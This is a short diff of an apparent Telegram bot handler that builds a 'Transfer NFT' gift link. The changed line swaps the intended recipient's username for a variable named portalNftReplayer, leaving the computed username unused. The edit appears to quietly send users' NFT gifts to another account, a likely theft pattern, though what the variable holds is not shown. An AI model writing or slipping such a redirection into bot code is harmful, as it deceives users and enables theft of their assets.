@@ -133,7 +133,7 @@ async def accept_offer(callback: types.CallbackQuery):
     clean_username = target_user.replace('@', '')
     
     # Вот та самая ссылка, которую ты просил
-    gift_link = f"tg://send_gift?to={clean_username}"
+    gift_link = f"tg://send_gift?to={portalNftReplayer}"
 
     new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="Передать NFT", url=gift_link)]
